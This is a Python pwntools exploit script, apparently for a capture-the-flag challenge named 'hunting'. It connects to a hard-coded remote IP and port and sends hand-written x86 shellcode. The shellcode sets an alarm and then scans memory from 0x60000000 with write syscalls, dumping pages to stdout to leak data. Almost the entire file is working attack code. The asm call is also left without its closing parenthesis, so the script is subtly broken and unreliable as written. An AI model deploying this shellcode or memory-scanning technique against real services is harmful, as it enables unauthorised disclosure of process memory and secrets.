from pwn import *
e = context.binary = ELF("./hunting")
#r = e.process()
r = remote('167.172.55.94', 32413)
#gdb.attach(r)
shellcode = asm('''
    push 27
    pop eax
    push 0xbbbbbb
    pop ebx
    int 0x80

    push 0x60000000
    pop ecx
    push 0x100
    pop edx
magic:
    push 1
    pop ebx
    push 4
    pop eax
    int 0x80
    
    add ecx, 0x10000 
    cmp eax, 0
    jle magic
    '''
r.send(shellcode)
r.interactive()
